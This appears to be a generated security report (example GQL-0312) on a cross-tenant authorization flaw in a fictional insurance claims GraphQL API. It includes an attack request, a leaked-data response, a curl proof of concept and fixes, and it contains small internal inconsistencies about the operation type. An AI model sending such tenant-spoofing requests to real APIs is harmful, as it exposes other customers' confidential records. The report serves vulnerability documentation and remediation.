# Security Analysis Report
**System:** ClaimsFlow Underwriting API
**Domain:** Insurance / Claims Processing
**Example ID:** GQL-0312
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.5 | Multi-tenant cross-tenant access via `bulkClaimLookup` — attacker passes victim `tenantId` in filter/IDs; resolvers trust client-supplied tenancy instead of JWT |

---

## Finding 1 — BOLA: Multi-Tenant Cross-Tenant Access on Claim Object (Pattern 1.5)

### Summary
ClaimsFlow Underwriting API (`api.claimsflow-underwrit.example.com`) accepts `tenantId` as a filter argument and trusts the client-supplied value instead of extracting it from the JWT. Per §5.0 Pattern 1.5, a token from `tenant-f751` submits `tenantId: "tenant-7517"` to access cross-tenant insurance claims data. The `bulkClaimLookup` mutation further compounds this by accepting arbitrary IDs without per-ID ownership filtering (RISK-GQL-312).

**Context.txt inconsistency (documented):** HAR mutation uses `bulkClaimLookup(ids: ["C-2312", "C-1312", "C-3312"])`, but the response key in §6.0 is `getClaim`. These conflict. The HAR (§6.0) is the primary evidence — this analysis follows the operation observed in the HAR (`bulkClaimLookup`). The response key inconsistency is noted as an artifact of the context.txt.

**Redis cache vulnerability:** Cache is keyed by `claimId` only (no user/tenant dimension), enabling cross-tenant cache poisoning of insurance claim data.

**Pattern:** 1.5 — Multi-tenant / cross-tenant access (BOLA)
**Affected resolver:** `bulkClaimLookup`
**Affected endpoint:** `POST https://api.claimsflow-underwrit.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.claimsflow-underwrit.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-f751

{"query": "query VulnerableOp { bulkClaimLookup(ids: [\"C-2312\", \"C-1312\", \"C-3312\"]) { claimId tenantId data { sensitiveField } } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Claim Data Returned (cross-tenant)**
```json
{
  "data": {
    "getClaim": {
      "tenantId": "tenant-7517",
      "ownerId": "other-user-f7517517",
      "data": {
        "sensitiveField": "CONFIDENTIAL-f7517517",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-f751`. Returned data belongs to: `tenant-7517`. Cross-tenant bulk claim access confirmed.

**Context.txt inconsistency:** HAR sends `bulkClaimLookup` mutation; response body uses key `getClaim`. HAR operation is authoritative.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.claimsflow-underwrit.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-f751" \
  -d '{"query": "query VulnerableOp { bulkClaimLookup(ids: [\"C-2312\", \"C-1312\", \"C-3312\"]) { claimId tenantId data { sensitiveField } } }"}'
# Vulnerable: response contains tenant-7517 claim data — cross-tenant bulk access succeeded
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch on ID C-2312"}]}
```

### Remediation
1. In `bulkClaimLookup`: for each ID in the array, assert `fetched.tenantId === jwt.tenantId`. Reject or skip IDs belonging to other tenants.
2. Never trust client-supplied `tenantId` in filter arguments — always derive from JWT claims.
3. Re-key Redis cache to include `tenantId`.
